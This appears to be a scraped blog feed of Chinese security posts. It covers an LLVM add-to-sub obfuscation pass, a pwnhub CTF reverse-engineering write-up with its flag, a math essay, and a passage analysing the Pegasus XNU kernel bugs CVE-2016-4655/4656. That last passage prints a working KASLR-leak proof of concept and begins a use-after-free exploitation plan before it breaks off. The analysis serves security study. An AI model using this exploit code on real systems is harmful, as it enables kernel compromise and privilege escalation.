接下来就是LLVM的使用，先创建一个hello.c源文件 #include &lt;stdio.h&gt; int main(){ printf(&quot;hello LLVM\\n&quot;); return 0; } 0x02 一个基于LLVM简单的代码混淆例子Pass是LLVM中一个很重要的部分，每个Pass都是做优化或者转换的工作，LLVM的优化和转换工作就是由很多个Pass一起完成的。我们通过继承指定的类以及实现相关的虚函数来实现具体的Pass，具体的类型主要有以下几种： ImmutablePass MoudlePass CallGraphSCCPass FuncationPass LoopPass RegionPass BasicBlockPass MachineFunctionPass 下面这个例子来介绍一下pass的编写并达到简单的混淆。从这里下载这个模板llvm-pass-skeleton 下面是完整代码： #include &quot;llvm/Pass.h&quot; #include &quot;llvm/IR/Function.h&quot; #include &quot;llvm/Support/raw_ostream.h&quot; #include &quot;llvm/IR/LegacyPassManager.h&quot; #include &quot;llvm/Transforms/IPO/PassManagerBuilder.h&quot; #include &quot;llvm/IR/Intrinsics.h&quot; #include &quot;llvm/IR/Instructions.h&quot; using namespace llvm; namespace { struct SkeletonPass : public FunctionPass { static char ID; SkeletonPass() : FunctionPass(ID) {} // virtual bool runOnFunction(Function &amp;F) { // errs() &lt;&lt; &quot;I saw a function called &quot; &lt;&lt; F.getName() &lt;&lt; &quot;!\\n&quot;; // return false; // } bool runOnFunction(Function &amp;F) override { Function *tmp = &amp;F; // 遍历函数中的所有基本块 for (Function::iterator bb = tmp-&gt;begin(); bb != tmp-&gt;end(); ++bb) { // 遍历基本块中的每条指令 for (BasicBlock::iterator inst = bb-&gt;begin(); inst != bb-&gt;end(); ++inst) { // 是否是add指令 if (inst-&gt;isBinaryOp()) { if (inst-&gt;getOpcode() == Instruction::Add) { ob_add(cast&lt;BinaryOperator&gt;(inst)); } } } } return false; } // a+b === a-(-b) bool ob_add(BinaryOperator *bo) { BinaryOperator *op = NULL; if (bo-&gt;getOpcode() == Instruction::Add) { // 生成 (－b) op = BinaryOperator::CreateNeg(bo-&gt;getOperand(1), &quot;&quot;, bo); // 生成 a-(-b) op = BinaryOperator::Create(Instruction::Sub, bo-&gt;getOperand(0), op, &quot;&quot;, bo); op-&gt;setHasNoSignedWrap(bo-&gt;hasNoSignedWrap()); op-&gt;setHasNoUnsignedWrap(bo-&gt;hasNoUnsignedWrap()); } // 替换所有出现该指令的地方 bo-&gt;replaceAllUsesWith(op); } }; } char SkeletonPass::ID = 0; // Automatically enable the pass. // http://adriansampson.net/blog/clangpass.html static void registerSkeletonPass(const PassManagerBuilder &amp;, legacy::PassManagerBase &amp;PM) { PM.add(new SkeletonPass()); } static RegisterStandardPasses RegisterMyPass(PassManagerBuilder::EP_EarlyAsPossible, registerSkeletonPass); 通过继承FunctionPass重写虚函数runOnFunction来到达我们代码混淆的目的，再看关键的混淆部分，如下面注释那样，找到函数中的add指令，并将其改为sub指令。如a+b经过混淆为a-(-b) bool runOnFunction(Function &amp;F) override { Function *tmp = &amp;F; // 遍历函数中的所有基本块 for (Function::iterator bb = tmp-&gt;begin(); bb != tmp-&gt;end(); ++bb) { // 遍历基本块中的每条指令 for (BasicBlock::iterator inst = bb-&gt;begin(); inst != bb-&gt;end(); ++inst) { // 是否是add指令 if (inst-&gt;isBinaryOp()) { if (inst-&gt;getOpcode() == Instruction::Add) { ob_add(cast&lt;BinaryOperator&gt;(inst)); } } } } return false; } 代码很简单，这里就不多说。我们使用 $clang -Xclang -load -Xclang build/skeleton/libSkeletonPass.* something.c 来运行这个pass编译成目标可执行文件现在我们创建一个addTest.c文件来测试是否代码混淆 #include &lt;stdio.h&gt; int func(int a,int b) { return a + b; } int main() { int c; c = func(6,9); printf(&quot;%d\\n&quot;,c); return c; } 先按照一般的编译源代码，查看关键汇编代码：然后运行我们的pass进行编译很明显，汇编代码发生了改变，当然这里仅仅是一个简单的混淆，感兴趣的可以研究下obfuscator-llvm这个项目。 0x03 参考链接深入剖析 iOS 编译 Clang / LLVMhttp://zke1ev3n.me/2016/01/18/%E5%9F%BA%E4%BA%8ELLVM%E7%9A%84%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86/","tags":[{"name":"LLVM","slug":"LLVM","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/LLVM/"},{"name":"obfuscation","slug":"obfuscation","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/obfuscation/"}]},{"title":"pwnhub-CTF re150","date":"2017-05-28T01:16:13.000Z","path":"2017/05/28/pwnhub-CTF-re150/pwnhub-CTF-re150/","text":"0x00 写在前面第一次做pwnhub题，最近参加了几场ctf比赛，pwnhub的题还是比较有一定难度的，这里记录下其中的一道逆向题。题目在这里 0x01 简单分析拿到题目后试着在虚拟机里运行了一下，看下有什么提示 然后转去hopper搜下相关字符串，并没有发现error相关字符串，syclover也没有相关printf等函数输出，看来只能上gdb调试看看。 发现程序里面有多处花指令以及隐藏了程序入口。 由上图可以发现syclover直接由int 0x80系统调用中断输出到屏幕，下面是一个循环解密，后面可知解密的正是程序的入口。 由__libc_start_main函数可得第一个参数即为main函数地址这里作为对比，可以看下hopper中对0x8048320main函数的解析完全不知道是什么有木有？所以拿到题如果放到IDA之类的反汇编工具根本看不出什么线索 接下来所做的事就是获取输入的字符串然后进行加密，然后与程序里的字符串加密比较，具体看后面的代码。 0x02 修复程序根据上面的分析，我们将程序进行修复 #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;fcntl.h&gt; #include &lt;unistd.h&gt; #include &lt;assert.h&gt; #include &lt;elf.h&gt; #define ENTRY 0x08048320 #define FILE_OFF 0x320 #define COUNT 0x432 int main(int argc,char *argv[]){ Elf32_Ehdr ehdr; unsigned char buf[COUNT] = {0}; assert(argc == 2); int fd = open(argv[1],O_RDWR);//打开文件 assert(fd&gt;0); assert(lseek(fd,0,SEEK_SET)!=-1);// 读取elf头 assert(read(fd,&amp;ehdr,sizeof(ehdr)) == sizeof(ehdr)); ehdr.e_entry = ENTRY;//修改入口地址 assert(lseek(fd,0,SEEK_SET)!=-1);//回写elf头 assert(write(fd,&amp;ehdr,sizeof(ehdr)) == sizeof(ehdr)); //解密 assert(lseek(fd,FILE_OFF,SEEK_SET)!=-1);//读取被加密的代码 assert(read(fd,buf,COUNT) == COUNT); int i = 0; while(i&lt;COUNT){ buf[i] = (buf[i]^66)&lt;&lt;5 | (buf[i]^66)&gt;&gt;3; i++; } assert(lseek(fd,FILE_OFF,SEEK_SET)!=-1);//写入正确代码 assert(write(fd,buf,COUNT) == COUNT); 0x03 分析算法计算flag#!/usr/bin/python # -*- coding: UTF-8 -*- from __future__ import print_function import sys def getflag(): print(&quot;[i]start to encrypt key&quot;) key = [0x73,0x8d,0xf2,0x4c,0xc7,0xd4,0x7b,0xf7,0x18,0x32,0x71,0x0d,0xcf,0xdc,0x67,0x4f,0x7f,0x0b,0x6d] encryptKey = [] print(&quot;encryptKey=[&quot;, end=&quot;&quot;) for idx in range(len(key)): encryptKey.append(key[idx] ^ 0x20) print(&quot;%x &quot; % encryptKey[idx], end=&quot;&quot;) print(&quot;]&quot;) flag = [] print(&quot;[i]find the flag&quot;) for i in range(len(encryptKey)): count = 0x00 while(count &lt;= 0x7f): one = count &gt;&gt; (((0 &gt;&gt; 0x1d) + i) &amp; 0x7 - (0 &gt;&gt; 0x1d)) two = count &lt;&lt; (0x8 - (((0 &gt;&gt; 0x1d) + i) &amp; 0x7 - (0 &gt;&gt; 0x1d))) if((((one | two) ^ i) &amp; 0xff) == encryptKey[i]): flag.append(count) break count = count + 1 print(&quot;flag = &quot;,end=&quot;&quot;) for i in range(len(flag)): print(&quot;%c&quot; % flag[i], end=&quot;&quot;) if __name__ == &#39;__main__&#39;: key = getflag() 最后运行程序得到flag [i]start to encrypt key encryptKey=[53 ad d2 6c e7 f4 5b d7 38 12 51 2d ef fc 47 6f 5f 2b 4d ] [i]find the flag flag = SYC{&gt;&gt;Wh06m1&gt;&gt;R0Ot} 测试：","tags":[{"name":"CTF","slug":"CTF","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/CTF/"},{"name":"writeup","slug":"writeup","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/writeup/"}]},{"title":"一道高中数学题的思考？","date":"2017-05-04T12:37:59.000Z","path":"2017/05/04/math/math/","text":"0x00 写在前面 突然在邮件中收到Quora中这样一个问题”What does X equal in $\\sqrt{x+15} + \\sqrt{x} = 15$? “ 凭着曾经对数学的热爱，我点了进去。顺便学习了点知识。 0x01 你会怎么解决？不得不承认，这种题型在初高中时候还是蛮常见的，在我的脑海里，也别无他法，一步一步去根号解方程吧。但都知道，同时平方带来就是可能会升高次数，有时候拿到答案还是挺繁琐的，至少计算上来说是这样的。 0x02 方法1 平方法通常解决这个问题的方法是将方程的两边平方并简化，并保持平方，直到方程中没有平方根 $\\sqrt{x+15} + \\sqrt{x} = 15$ $(\\sqrt{x+15} + \\sqrt{x})^2 = 15^2$ $x+15 + 2\\sqrt{(x+15)x} + x = 225$ $2\\sqrt{(x+15)x} = 210 - 2x$ $\\sqrt{(x+15)x} = 105 - x$ $(\\sqrt{(x+15)x})^2 = (105 - x)^2$ $x^2 + 15x = 11025 - 210x +x^2$ $225x = 11025$ $ x = 49$思维过程很清楚，但明显计算上有点繁琐。 0x03 方法2 拼凑法不一定可靠，但一定最快。大多情况下，都是开方后是整数。所以每个完全平方数的序列（$1^22^23^3…6^27^28^2… =&gt; 1 4 9 16 25 36 49 64 …$） 哪两个数相差15呢？很明显64 - 49 = 15，也许你觉得这很不靠谱，其实至少对于开方是整数的结果来说是很快的，觉得慢主要是你还不熟练。因为并不是一个一个的去试验，因为相邻之差是递增且快。类似二叉树来查找会很快得出结果。 $\\sqrt{49 + 15} + \\sqrt{49} = 15$ $7 + 8 = 15$最快，但不一定可靠。 0x04 方法3 平方差法暂且称作平方差法吧，这个方法是我最推荐的，既快又准。原式：$\\sqrt{x+15} + \\sqrt{x} = 15$ (1) 设 $\\sqrt{x+15} - \\sqrt{x} = k$ 又 $(\\sqrt{x+15} - \\sqrt{x})(\\sqrt{x+15} + \\sqrt{x})= 15k$ 解得： $k = 1$ 所以 $\\sqrt{x+15} - \\sqrt{x} = 1$ （2） 然后（1）+ (2): $2\\sqrt{x+15} = 16$ 解得: $x = 49$ 多么棒的一个方法 I love it！ 0x05 我与数学从小数学就比语文好的我，数学确实给了我很多自信，想破头皮的去思考一个一个的题。一如既往的热爱，以致于高考只填了一个专业–数学。由于种种原因，没能选上，去来到了计算机相关的专业。计算机科学同样是一个迷人的世界，那种理解本质，控制计算机的运行是让人着迷的。在反馈上来说，计算机比做数学得到的反馈更真实，快速。做数学题的时候总是找不到方向，得到的反馈少且慢，容易让人沮丧，想必这也是大多人讨厌数学的原因之一吧。虽然现在更热爱计算机，但心底里仍然有一个数学的种子。以至于很多时候看到感兴趣的题也会拿上纸笔算一算，知乎上也关注了相关话题，还有一个自己特别骄傲的回答，关于高中数列的，具体情况移步高考数学数列放缩总结技巧有哪些？相信不管是现在还是将来，数学都是我最深处的支持。","tags":[{"name":"math","slug":"math","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/math/"}]},{"title":"Pegasus内核漏洞及PoC分析","date":"2017-05-01T06:52:45.000Z","path":"2017/05/01/Pegasus内核漏洞及PoC分析/Pegasus内核漏洞及PoC分析/","text":"0x00 写在前面 不知道为什么，刚开始就有很多话想说。因为看似是本文开始，实际却是连续几天几夜的分析的结束。本文将详细介绍iOS三叉戟漏洞，其影响涉及OS X 10.11.6和 iOS 9.3.4。这里为了方便以及简单，环境为OS X 关注iOS安全的技术人员都或多或少的了解这个漏洞，这里就不多说，可以参考下面的链接或者自行Google 1.iOS“远程越狱”间谍软件Pegasus技术分析 2.iOS三叉戟漏洞补丁分析、利用代码 公布（POC 3.Pegasus – 针对iOS设备的APT攻击分析 0x01 目录 OSUnserializeBinary概述 漏洞分析-CVE-2016-4655，CVE-2016-4656 漏洞利用-PoC分析 总结 0x02 OSUnserializeBinary概述 序列化与反序列化在软件开发的过程中，两个模块通信时就需要序列化与发序列化，常见的xml-&gt;JSON，对应的反序列化JOSN-&gt;xml。简单来说就是数据格式上的一种相互转化。在XNU内核也有一个实现，OSUnserializeXML(将xml格式转化为内核数据对象)和OSUnserializeBinary(将二进制格式转化为内核数据对象) OSUnserializeBinary的二进制格式OSUnserializeBinary这个函数将连续的二进制流分成uint32_t32字节来处理。所以32位的整数就有特殊含义来表示一些数据结构。如下 #define kOSSerializeBinarySignature &quot;\\323\\0\\0&quot; /* 0x000000d3 */ enum { kOSSerializeDictionary = 0x01000000U, kOSSerializeArray = 0x02000000U, kOSSerializeSet = 0x03000000U, kOSSerializeNumber = 0x04000000U, kOSSerializeSymbol = 0x08000000U, kOSSerializeString = 0x09000000U, kOSSerializeData = 0x0a000000U, kOSSerializeBoolean = 0x0b000000U, kOSSerializeObject = 0x0c000000U, kOSSerializeTypeMask = 0x7F000000U, kOSSerializeDataMask = 0x00FFFFFFU, kOSSerializeEndCollection = 0x80000000U, }; 这里的0x000000d3代表了这个数据流的签名即开始的32位必须为该整数值，下面有一个字典，数组，集合等集合类数据结构，也有数字，字符串等基本数据结构表示。kOSSerializeTypeMask和kOSSerializeDataMask分别为类型和数据大小掩码。kOSSerializeEndCollection代表当前集合(dic，array或set)是否结束。可以看到，31位表示当前集合是否结束，30-24位表示当前数据类型，23-0表示元素的长度。 当前集合是否结束 当前数据类型 当前元素长度 0 0000000 000000000000000000000000 例如下面的二进制数据 0x000000d3 0x81000000 0x09000004 0x41414141 0x8b000001 则对应： &lt;dict&gt; &lt;string&gt;AAAA&lt;/string&gt; //键key &lt;boolean&gt;1&lt;/boolean&gt; //值value &lt;/dict&gt; 这样的数据结构。对应过程也很简单，0x000000d3标志为合法的签名，0x81000000为dic类型且为最后一个元素，0x09000004为4字节大小的字符串，0x8b000001为bool型，所以只需用最后一位代表true或false OSUnserializeBinary()分析完整源代码见文末，下面将对其中几个重要的地方分别做分析说明 while (ok) { bufferPos += sizeof(*next); if (!(ok = (bufferPos &lt;= bufferSize))) break; key = *next++; len = (key &amp; kOSSerializeDataMask); wordLen = (len + 3) &gt;&gt; 2; end = (0 != (kOSSerializeEndCollecton &amp; key)); newCollect = isRef = false; o = 0; newDict = 0; newArray = 0; newSet = 0; switch (kOSSerializeTypeMask &amp; key) { case kOSSerializeDictionary: ... case kOSSerializeArray: ... case kOSSerializeSet: ... case kOSSerializeObject: ... case kOSSerializeNumber: ... case kOSSerializeSymbol: ... case kOSSerializeString: ... case kOSSerializeData: ... case kOSSerializeBoolean: ... default: break; } ... 进行一些初始化和检查后就进入while(ok)循环，并且是以32位的整数位单位遍历循环，读取当前的整数key，确定其长度len，当前集合31位是否设置end。并通过类型掩码kOSSerializeTypeMask确定其key的类型从而进入不同的case。例如我们看kOSSerializeDictionary例子 case kOSSerializeDictionary: o = newDict = OSDictionary::withCapacity(len); newCollect = (len != 0); break; o为指向当前反序列化对象的指针，在每种case中被指定 case kOSSerializeData: bufferPos += (wordLen * sizeof(uint32_t)); if (bufferPos &gt; bufferSize) break; o = OSData::withBytes(next, len); next += wordLen; break; 这里当遇到一个为kOSSerializeData类型时，根据其len找到其数据并将其存储在OSData数据结构中，并移动next。其他的case都做类似对应的处理。跳出switch if (!(ok = (o != 0))) break; 因为每一次循环都会进入case并将o设置为对应对象才合法，当等于0时就说明不合法，则退出。 if (!isRef) { setAtIndex(objs, objsIdx, o); if (!ok) break; objsIdx++; } 这里很重要将与后面的漏洞相关，首先判断isRef是否被设置。 case kOSSerializeObject: if (len &gt;= objsIdx) break; o = objsArray[len]; o-&gt;retain(); isRef = true; break; isRef只有当当前的类型为kOSSerializeObject即引用类型是才被设为true，这里引用的意思则表示当前指向dic中其他数据，其值为对应下标。回到前面那里，下面重点关注setAtIndex这个宏定义 #define setAtIndex(v, idx, o) \\ if (idx &gt;= v##Capacity) \\ { \\ uint32_t ncap = v##Capacity + 64; \\ typeof(v##Array) nbuf = (typeof(v##Array)) kalloc_container(ncap * sizeof(o)); \\ if (!nbuf) ok = false; \\ if (v##Array) \\ { \\ bcopy(v##Array, nbuf, v##Capacity * sizeof(o)); \\ kfree(v##Array, v##Capacity * sizeof(o)); \\ } \\ v##Array = nbuf; \\ v##Capacity = ncap; \\ } \\ if (ok) v##Array[idx] = o; 看着很复杂，但简单来说就是如果数组大小不够的话就增加大小，然后就将其之前的o指向的对象放到objs数组中对应的位置。 if (dict) { if (sym) { if (o != dict) ok = dict-&gt;setObject(sym, o, true); o-&gt;release(); sym-&gt;release(); sym = 0; } else { sym = OSDynamicCast(OSSymbol, o); if (!sym &amp;&amp; (str = OSDynamicCast(OSString, o))) { sym = (OSSymbol *) OSSymbol::withString(str); o-&gt;release(); o = 0; } ok = (sym != 0); } } else if (array) { ok = array-&gt;setObject(o); o-&gt;release(); } else if (set) { ok = set-&gt;setObject(o); o-&gt;release(); } else { assert(!parent); result = o; } 对解析出来的当前的集合做对应处理，比如这里的如果dic为真，因为dic字典数据结构需要key-&gt;value键值对的形式，所以先判断sym，若没设置，则代表当前o对象为key，则将其转化为OSSymbol类型，设置sym为true并将ofree，那么下一次的o代表的对象一定是值，然后就将sym和o以键值对的形式存储在dic字典中，如此交替。后面的代码对漏洞来说不是很重要了 if (newCollect) { if (!end) { stackIdx++; setAtIndex(stack, stackIdx, parent); if (!ok) break; } DEBG(&quot;++stack[%d] %p\\n&quot;, stackIdx, parent); parent = o; dict = newDict; array = newArray; set = newSet; end = false; } if (end) { if (!stackIdx) break; parent = stackArray[stackIdx]; DEBG(&quot;--stack[%d] %p\\n&quot;, stackIdx, parent); stackIdx--; set = 0; dict = 0; array = 0; if (!(dict = OSDynamicCast(OSDictionary, parent))) { if (!(array = OSDynamicCast(OSArray, parent))) ok = (0 != (set = OSDynamicCast(OSSet, parent))); } } 简单来说就是判断是否有新集合，如有的话，就将其压入栈中，那么后面的元素都放到新集合中，当end时就将整个新集合放入之前的dic。 0x03 漏洞分析-CVE-2016-4655，CVE-2016-4656这里将介绍两个漏洞：1，CVE-2016-4655-infoleak漏洞；2，CVE-2016-4656-UAF漏洞 CVE-2016-4655-infoleak和我们之前分析的linux中printf格式漏洞类似，利用这个漏洞我们可以获取到内核栈中的地址信息，这些信息对于绕过KASLR内核地址空间随机偏移非常有用，因为系统每次启动时内核地址都偏移了一随机数，一旦确定了KSALR，我们就可以进一步做ROP等攻击。 下面看漏洞点，回顾之前kOSSerializeNumber这个case内容 case kOSSerializeNumber: bufferPos += sizeof(long long); if (bufferPos &gt; bufferSize) break; value = next[1]; value &lt;&lt;= 32; value |= next[0]; o = OSNumber::withNumber(value, len); next += 2; break; 这里存在什么问题呢？这里没有检查OSNumber的长度，也就是说我们可以创建一个任意长度的OSNumber，进而在内核读取的时候越界，然后泄漏内核地址信息。 CVE-2016-4656-UAF漏洞UAF漏洞即当一个已经free的内存在某处被引用以后发生，可以想象，一个被free的对象其内容是不确定的，对其引用则会造成不可预测的后果。因为内存可能随时被其他对象占用，而在这里，如果我们时机足够恰当，就可以精心构造一个对象占用free的内存，当前引用时，就会按照我们的计划执行。来看下漏洞点，下面的代码是序列化字典dic将OSString这个键转化为OSSymbol，见下 if (dict) { if (sym) { ... } else { sym = OSDynamicCast(OSSymbol, o); if (!sym &amp;&amp; (str = OSDynamicCast(OSString, o))) { sym = (OSSymbol *) OSSymbol::withString(str); o-&gt;release(); o = 0; } ok = (sym != 0); } } 这里o-&gt;release()有什么问题呢?还记得objsArray吧，用来存储所有的对象，但是用setAtIndex这个宏来将所有的对象o存在里面，而宏不实现任何类型的引用计数机制，所以存储在其中的引用不会被删除。这在我们不引用其他对象的时候是没有什么问题的，但如果是一个引用对象的话，看下面kOSSerializeObject中的switchcase。 case kOSSerializeObject: if (len &gt;= objsIdx) break; o = objsArray[len]; o-&gt;retain(); isRef = true; break; 此时之前存储在之前的objsArray的OSString已经free，而 o = objsArray[len]; o-&gt;retain();由对其进行了retain引用，好的一个完美的UAF漏洞。所以我们可以构造一个字典dic，其中OSString包含一些配对的值，然后序列化一个kOSSerializeObject引用对象，OSString将调用retain，但却是一个被释放的对象。 0x04 漏洞利用-PoC分析同样分为两个漏洞利用：1，CVE-2016-4655-infoleak漏洞利用；2，CVE-2016-4656-UAF漏洞利用 CVE-2016-4655-infoleak漏洞利用infoleak漏洞利用步骤： 构造一个包含过长的OSNumberdic字典 用这个序列化字典去设置userclient对象的属性 读回设置的OSNumber属性，造成infoleak 利用读取回来的内核地址信息计算KASLR 完整的代码。 uint64_t kslide_infoleak(void) { kern_return_t kr = 0, err = 0; mach_port_t res = MACH_PORT_NULL, master = MACH_PORT_NULL; io_service_t serv = 0; io_connect_t conn = 0; io_iterator_t iter = 0; uint64_t kslide = 0; void *dict = calloc(1, 512); uint32_t idx = 0; // index into our data #define WRITE_IN(dict, data) do { *(uint32_t *)(dict + idx) = (data); idx += 4; } while (0) WRITE_IN(dict, (0x000000d3)); // signature, always at the beginning WRITE_IN(dict, (kOSSerializeEndCollection | kOSSerializeDictionary | 2)); // dictionary with two entries WRITE_IN(dict, (kOSSerializeSymbol | 4)); // key with symbol, 3 chars + NUL byte WRITE_IN(dict, (0x00414141)); // &#39;AAA&#39; key + NUL byte in little-endian WRITE_IN(dict, (kOSSerializeEndCollection | kOSSerializeNumber | 0x200)); // value with big-size number WRITE_IN(dict, (0x41414141)); WRITE_IN(dict, (0x41414141)); // at least 8 bytes for our big numbe host_get_io_master(mach_host_self(), &amp;master); // get iokit master port kr = io_service_get_matching_services_bin(master, (char *)dict, idx, &amp;res); if (kr == KERN_SUCCESS) { printf(&quot;(+) Dictionary is valid! Spawning user client...\\n&quot;); } else return -1; serv = IOServiceGetMatchingService(master, IOServiceMatching(&quot;IOHDIXController&quot;)); kr = io_service_open_extended(serv, mach_task_self(), 0, NDR_record, (io_buf_ptr_t)dict, idx, &amp;err, &amp;conn); if (kr == KERN_SUCCESS) { printf(&quot;(+) UC successfully spawned! Leaking bytes...\\n&quot;); } else return -1; IORegistryEntryCreateIterator(serv, &quot;IOService&quot;, kIORegistryIterateRecursively, &amp;iter); io_object_t object = IOIteratorNext(iter); char buf[0x200] = {0}; mach_msg_type_number_t bufCnt = 0x200; kr = io_registry_entry_get_property_bytes(object, &quot;AAA&quot;, (char *)&amp;buf, &amp;bufCnt); if (kr == KERN_SUCCESS) { printf(&quot;(+) Done! Calculating KASLR slide...\\n&quot;); } else return -1; #if 0 for (uint32_t k = 0; k &lt; 128; k += 8) { printf(&quot;%#llx\\n&quot;, *(uint64_t *)(buf + k)); } #endif uint64_t hardcoded_ret_addr = 0xffffff80003934bf; kslide = (*(uint64_t *)(buf + (7 * sizeof(uint64_t)))) - hardcoded_ret_addr; printf(&quot;(i) KASLR slide is %#016llx\\n&quot;, kslide); return kslide; } 构造字典看下面这段代码 void *dict = calloc(1, 512); uint32_t idx = 0; // index into our data #define WRITE_IN(dict, data) do { *(uint32_t *)(dict + idx) = (data); idx += 4; } while (0) 这里的WRITE_IN这个宏只是为了方便我们将数据填入内存之中 xml的字典格式 &lt;dict&gt; &lt;symbol&gt;AAA&lt;/symbol&gt; &lt;number size=0x200&gt;0x4141414141414141&lt;/number&gt; &lt;/dict&gt; 对应的代码 WRITE_IN(dict, (0x000000d3)); // 头部签名 WRITE_IN(dict, (kOSSerializeEndCollection | kOSSerializeDictionary | 2)); // 包含两个元素的字典 WRITE_IN(dict, (kOSSerializeSymbol | 4)); // 长度为3的symbol WRITE_IN(dict, (0x00414141)); // &#39;AAA&#39; key键 WRITE_IN(dict, (kOSSerializeEndCollection | kOSSerializeNumber | 0x200)); //0x200大小的number WRITE_IN(dict, (0x41414141)); WRITE_IN(dict, (0x41414141)); //实际8字节的number 利用io_service_get_matching_services_bin测试我们的dic是否有效 host_get_io_master(mach_host_self(), &amp;master); // get iokit master port kr = io_service_get_matching_services_bin(master, (char *)dict, idx, &amp;res); if (kr == KERN_SUCCESS) { printf(&quot;(+) Dictionary is valid! Spawning user client...\\n&quot;); } else return -1; 若kr == KERN_SUCCESS则我们的dic则为有效 生成UserClient设定属性我们需要一个UserClient用来和内核通信，所以使用io_service_open_extended来产生一个相关服务的UserClient，这里的服务并不重要 serv = IOServiceGetMatchingService(master, IOServiceMatching(&quot;IOHDIXController&quot;)); kr = io_service_open_extended(serv, mach_task_self(), 0, NDR_record, (io_buf_ptr_t)dict, idx, &amp;err, &amp;conn); if (kr == KERN_SUCCESS) { printf(&quot;(+) UC successfully spawned! Leaking bytes...\\n&quot;); } else return -1; 首先我们通过IOServiceGetMatchingService去从IORegistry里匹配一个特定服务，然后通过io_service_open_extended让可以设置其属性并打开一个服务即隐式产生UserClient接下来就需要读取属性，我们通过得到一个访问的句柄，所以迭代IORegistry找到刚刚创建的UserClient。 IORegistryEntryCreateIterator(serv, &quot;IOService&quot;, kIORegistryIterateRecursively, &amp;iter); io_object_t object = IOIteratorNext(iter); 先通过serv端口创建io_iterator_t，我们的UserClient在serv创建之后，所以拿到iter后迭代一次即为我们的UserClient，现在就可以读取其属性并触发info-leak。 读取属性，触发info-leakchar buf[0x200] = {0}; mach_msg_type_number_t bufCnt = 0x200; kr = io_registry_entry_get_property_bytes(object, &quot;AAA&quot;, (char *)&amp;buf, &amp;bufCnt); if (kr == KERN_SUCCESS) { printf(&quot;(+) Done! Calculating KASLR slide...\\n&quot;); } else return -1; 通过io_registry_entry_get_property_bytes我们可以获取到原始字节，存在buf中，我们打印其值 for (uint32_t k = 0; k &lt; 128; k += 8) { printf(&quot;%#llx\\n&quot;, *(uint64_t *)(buf + k)); } 对应输出： 0x4141414141414141 // 有效的number 0xffffff8033c66284 // 0xffffff8035b5d800 // 0x4 // 其他数据或返回地址 0xffffff803506d5a0 // 0xffffff8033c662b4 // 0xffffff818d2b3e30 // 0xffffff80037934bf // 函数返回地址 ... 我们需要清楚函数的调用过程，那么久知道栈中返回地址所属函数这里实际读取的代码位于is_io_registry_entry_get_property_bytes函数，即io_registry_entry_get_property_bytes调用了 is_io_registry_entry_get_property_bytes。 is_io_registry_entry_get_property_bytes源代码 /* Routine io_registry_entry_get_property */ kern_return_t is_io_registry_entry_get_property_bytes( io_object_t registry_entry, io_name_t property_name, io_struct_inband_t buf, mach_msg_type_number_t *dataCnt ) { OSObject * obj; OSData * data; OSString * str; OSBoolean * boo; OSNumber * off; UInt64 offsetBytes; unsigned int len = 0; const void * bytes = 0; IOReturn ret = kIOReturnSuccess; CHECK( IORegistryEntry, registry_entry, entry ); #if CONFIG_MACF if (0 != mac_iokit_check_get_property(kauth_cred_get(), entry, property_name)) return kIOReturnNotPermitted; #endif obj = entry-&gt;copyProperty(property_name); if( !obj) return( kIOReturnNoResources ); // One day OSData will be a common container base class // until then... if( (data = OSDynamicCast( OSData, obj ))) { len = data-&gt;getLength(); bytes = data-&gt;getBytesNoCopy(); } else if( (str = OSDynamicCast( OSString, obj ))) { len = str-&gt;getLength() + 1; bytes = str-&gt;getCStringNoCopy(); } else if( (boo = OSDynamicCast( OSBoolean, obj ))) { len = boo-&gt;isTrue() ? sizeof(&quot;Yes&quot;) : sizeof(&quot;No&quot;); bytes = boo-&gt;isTrue() ? &quot;Yes&quot; : &quot;No&quot;; } else if( (off = OSDynamicCast( OSNumber, obj ))) { /* j: reading an OSNumber */ offsetBytes = off-&gt;unsigned64BitValue(); len = off-&gt;numberOfBytes(); bytes = &amp;offsetBytes; #ifdef __BIG_ENDIAN__ bytes = (const void *) (((UInt32) bytes) + (sizeof( UInt64) - len)); #endif } else ret = kIOReturnBadArgument; if( bytes) { if( *dataCnt &lt; len) ret = kIOReturnIPCError; else { *dataCnt = len; bcopy( bytes, buf, len ); } } obj-&gt;release(); return( ret ); } 下面代码表示正在读取OSNumber， ... else if( (off = OSDynamicCast( OSNumber, obj ))) { offsetBytes = off-&gt;unsigned64BitValue(); /* j: the offsetBytes variable is allocated on the stack */ len = off-&gt;numberOfBytes(); /* j: this reads out our malformed length, 0x200 */ bytes = &amp;offsetBytes; /* j: bytes* ptr points to a stack variable */ ... } ... 然后 if( bytes) { if( *dataCnt &lt; len) ret = kIOReturnIPCError; else { *dataCnt = len; bcopy( bytes, buf, len ); /* j: this leaks data from the stack */ } } 执行bcopy时，从bytes里读取了错误的长度，指向堆栈变量，泄漏函数返回地址，我们只需要找到一个地址减去静态地址，那么就能计算出内核偏移值 计算内核偏移将/System/Library/Kernels/kernel拖入hopper，搜索is_io_registry_entry_get_property_bytes，如下图 然后通过Xref找到调用的下一条地址即返回地址，最后将之前偏移后的地址-静态地址就等到了内核偏移值 0xffffff80037934bf - 0xffffff80003934bf = 0x3400000 也就是下面这段代码所示： uint64_t hardcoded_ret_addr = 0xffffff80003934bf; kslide = (*(uint64_t *)(buf + (7 * sizeof(uint64_t)))) - hardcoded_ret_addr; printf(&quot;(i) KASLR slide is %#016llx\\n&quot;, kslide); 现在获取到了内核偏移值就可以利用UAF漏洞执行ROP链然后提权root。here we go！ CVE-2016-4656-UAF漏洞利用XNU的堆分配器被称为zalloc，这次我可以偷下懒了，与我之前分析得linux堆分配器相比虽然细节上可能有所不同，但基本原理都大同小异，简单的说来就是提供了不同的分配表，free后的元素会放入对应大小的链表之中，且位于最后，即如果时间合适，我们下次分配同样大小的内存就会返回刚free的内存。还不清楚的可以移步深入理解Linux堆分配器-DLMalloc这篇分析。那么下面要做的就是如何构造下一个分配的对象，这里我们用OSData因为可以使用原生的二进制数据。回忆之前的UAF漏洞，当下一次o-&gt;retain引用就会触发，这里涉及到一个C++虚拟函数表的问题，当然我之前也分析过，不清楚的可以移步详解virtual table简单说来一个对象的地址实际指向的是vtable，通过vtable就能找到对应的函数。所以我们可以构造假的vtable地址达到控制rip到自定义的地址。当然这里还有另一个技术-map 